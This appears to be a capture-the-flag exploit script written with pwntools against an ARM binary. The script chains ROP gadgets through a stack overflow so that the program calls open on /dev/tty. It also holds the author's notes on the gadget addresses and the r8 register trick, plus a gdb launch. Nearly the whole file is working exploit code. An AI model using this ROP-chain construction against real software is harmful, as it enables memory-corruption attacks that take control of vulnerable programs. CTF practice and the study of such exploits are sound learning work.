#!/usr/bin/env python3
from pwn import *
import os

context.binary = "./main"

# rops
rop_r1_t_adr = 0x0004407c  # ; pop {r1, pc} !thumb
rop_mov_r0_r8_t_adr = 0x00020ca8 # ; mov r0,r8 / add sp,#0x8 / pop.w {r4, r5, r6, r7, r8, r9, r10, pc}

rop_lr_adr = 0x0003df1c  # ; pop {r4, r6, r7, fp, ip, lr, pc}
rop_bx_lr_adr = 0x00018108  # ; bx lr

rop_open_t_adr = 0x00026c2c  # open

elf = ELF(context.binary.path)
rop = ROP(elf)
#rop.call("open", [b"/dev/tty"])

"""
What I want to have

This is a bit complicated actually, but essentially I can jump recursevly into pop instructions and fill my buffers with such

Open question is how I get control over the stack to inject my /dev/tty or similar

Okay. Helpful:
  - r8 seems to be set to the stackpointer at a known and stable offset from sp. 
    Assumption is 364 bytes after sp in func vuln
  - so overwrite stuff in r8
  - then r0 needs to be set to r8
    - see addr 0x00020ca8
       0x00020ca8               4046  mov r0, r8
       0x00020caa               02b0  add sp, 8
       0x00020cac           bde8f087  pop.w {r4, r5, r6, r7, r8, sb, sl, pc}
  - call open

non thumb:
  0x0003df1c : pop {r4, r6, r7, fp, ip, lr, pc}
    - doesn't pop r8, but sets lr and pc

"""

def build_lr(r4, r6, r7, fp, ip, lr):
    payload = p32(rop_lr_adr)
    payload += p32(r4) + p32(r6) + p32(r7) + p32(fp) + p32(ip)
    payload += p32(lr)
    return payload

def build_mov_r0_r8_t(r4, r5, r6, r7, r8, r9, r10):
    payload = p32(rop_mov_r0_r8_t_adr + 1)
    payload += b"0" * 8
    payload += p32(r4) + p32(r5) + p32(r6) + p32(r7) + p32(r8) + p32(r9) + p32(r10)
    return payload


payload = b"0" * 0x20

payload += b"1" * 4

# trying to execute rop_r1_t_adr in thumb mode
payload += build_lr(0, 0, 0, 0, 0, rop_r1_t_adr + 1)
payload += p32(rop_bx_lr_adr)

# write to r1
payload += p32(os.O_RDWR)

# move r8 to r0
payload += build_mov_r0_r8_t(0, 0, 0, 0, 0, 0, 0)
payload += build_lr(0, 0, 0, 0, 0, rop_open_t_adr + 1)
payload += p32(rop_open_t_adr + 1)

assert len(payload) < 404
payload += b"1" * (404 - len(payload))

payload += b"/dev/tty\0"

io = gdb.debug(context.binary.path, gdbscript="""
source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
b vuln
b *0x104a4
b *0x0004407c
b open
""")
io.sendline(payload)
io.interactive()
